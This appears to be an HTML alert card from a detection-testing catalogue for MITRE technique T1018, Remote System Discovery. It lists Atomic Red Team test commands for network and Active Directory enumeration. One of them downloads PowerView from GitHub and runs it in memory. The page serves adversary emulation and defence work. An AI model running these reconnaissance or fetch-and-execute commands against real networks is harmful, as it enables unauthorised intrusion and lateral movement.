<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Alert: Remote System Discovery</title>
  <style>
    body { font-family: Segoe UI, Arial, sans-serif; margin: 2rem; background: #f6f7fb; }
    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 700px; margin: auto; }
    h1 { margin-top: 0; font-size: 2rem; }
    .desc, .id, .link, .author, .tactic, .status { margin-bottom: 1.1em; }
    .meta { font-size: .95em; color: #555; margin-bottom: .8em; }
    .section { font-size: .99em; }
    .scenario-block { background: #f4f0d9; border-radius: 7px; padding: 1em 1.2em; margin-bottom: 1.2em; color:#4a4500; font-size:1.07em; border-left:5px solid #e1c553; }
    pre { background: #eee; padding: .7em 1em; border-radius: 5px; }
    code { background: #f6f6f6; padding: 2px 5px; border-radius: 2px; }
    ul { margin-left: 1.6em; }
  </style>
</head>
<body>
<div class="card">
  <h1>Alert: Remote System Discovery</h1>
  <div class="meta"><b>Technique ID:</b> T1018<div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'><b>Atomic Red Team – dostępne testy dla tej techniki:</b><ul><li><b>Remote System Discovery - net</b><br><b>Polecenia testowe (cmd):</b><pre>net view /domain
net view</pre><a href='../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_net/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Remote System Discovery - net group Domain Computers</b><br><b>Polecenia testowe (cmd):</b><pre>net group "Domain Computers" /domain</pre><a href='../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_net_group_Doma/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Remote System Discovery - nltest</b><br><b>Polecenia testowe (cmd):</b><pre>nltest.exe /dclist:#{target_domain}</pre><a href='../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_nltest/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Remote System Discovery - ping sweep</b><br><b>Polecenia testowe (cmd):</b><pre>for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i</pre><a href='../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_ping_sweep/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Remote System Discovery - arp</b><br><b>Polecenia testowe (cmd):</b><pre>arp -a</pre><a href='../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_arp/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Remote System Discovery - nslookup</b><br><b>Polecenia testowe (powershell):</b><pre>$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$pieces = $localip.split(".")
$firstOctet = $pieces[0]
$secondOctet = $pieces[1]
$thirdOctet = $pieces[2]
foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}</pre><a href='../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_nslookup/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Remote System Discovery - adidnsdump</b><br><b>Polecenia testowe (cmd):</b><pre>"#{venv_path}\Scripts\adidnsdump" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}</pre><a href='../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_adidnsdump/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Adfind - Enumerate Active Directory Computer Objects</b><br><b>Polecenia testowe (cmd):</b><pre>"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer) #{optional_args}</pre><a href='../../scenarios/atomic_tests\T1018\Adfind_-_Enumerate_Active_Directory_Comp/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Adfind - Enumerate Active Directory Domain Controller Objects</b><br><b>Polecenia testowe (cmd):</b><pre>"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -sc dclist</pre><a href='../../scenarios/atomic_tests\T1018\Adfind_-_Enumerate_Active_Directory_Doma/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Enumerate domain computers within Active Directory using DirectorySearcher</b><br><b>Polecenia testowe (powershell):</b><pre>$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
$DirectorySearcher.PropertiesToLoad.Add("Name")
$Computers = $DirectorySearcher.findall()
foreach ($Computer in $Computers) {
  $Computer = $Computer.Properties.name
  if (!$Computer) { Continue }
  Write-Host $Computer}</pre><a href='../../scenarios/atomic_tests\T1018\Enumerate_domain_computers_within_Active/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Enumerate Active Directory Computers with Get-AdComputer</b><br><b>Polecenia testowe (powershell):</b><pre>Get-AdComputer -Filter *</pre><a href='../../scenarios/atomic_tests\T1018\Enumerate_Active_Directory_Computers_wit/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Enumerate Active Directory Computers with ADSISearcher</b><br><b>Polecenia testowe (powershell):</b><pre>([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()</pre><a href='../../scenarios/atomic_tests\T1018\Enumerate_Active_Directory_Computers_wit/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Get-DomainController with PowerView</b><br><b>Polecenia testowe (powershell):</b><pre>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose</pre><a href='../../scenarios/atomic_tests\T1018\Get-DomainController_with_PowerView/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Get-WmiObject to Enumerate Domain Controllers</b><br><b>Polecenia testowe (powershell):</b><pre>try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
catch { $_; exit $_.Exception.HResult }</pre><a href='../../scenarios/atomic_tests\T1018\Get-WmiObject_to_Enumerate_Domain_Contro/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Remote System Discovery - net group Domain Controller</b><br><b>Polecenia testowe (cmd):</b><pre>net group /domain "Domain controllers"</pre><a href='../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_net_group_Doma/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Enumerate Remote Hosts with Netscan</b><br><b>Polecenia testowe (powershell):</b><pre>cmd /c '#{netscan_path}' /hide /auto:"$env:temp\T1018NetscanOutput.txt" /range:'#{range_to_scan}'</pre><a href='../../scenarios/atomic_tests\T1018\Enumerate_Remote_Hosts_with_Netscan/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>remove-item "$env:temp\T1018NetscanOutput.txt" -force -erroraction silentlycontinue</pre><a href='../../scenarios/atomic_tests\T1018\Enumerate_Remote_Hosts_with_Netscan/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li></ul><a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1018' target='_blank'>Zobacz wszystkie testy na GitHubie</a></div></div>
  <div class="tactic section"><b>Tactics:</b> <a href="https://attack.mitre.org/tactics/TA0007/" target="_blank">Discovery (TA0007)</a></div>
  <div class="status section"><b>Status:</b> Pending</div>
  <div class="scenario-block"><b>Twój opis scenariusza:</b><br>Opis scenariusza, podatności lub techniki.</div>
  <div class="desc section"><b>MITRE Description:</b><br>Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.  Adversaries may also analyze data from local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.  Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)</div>
  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1018/" target="_blank">https://attack.mitre.org/techniques/T1018/</a></div>
  <div class="author section"><b>Author:</b> Krzysztof K.</div>
</div>
</body>
</html>
